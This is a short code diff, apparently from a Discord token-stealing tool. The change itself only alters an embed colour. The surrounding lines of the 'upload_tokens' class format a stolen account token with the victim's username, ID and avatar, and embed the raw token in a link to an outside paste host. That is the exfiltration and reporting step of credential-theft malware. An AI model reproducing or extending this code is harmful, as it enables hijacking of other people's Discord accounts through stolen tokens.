@@ -339,7 +339,7 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username} ({user_id})", color=1127128)
+            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
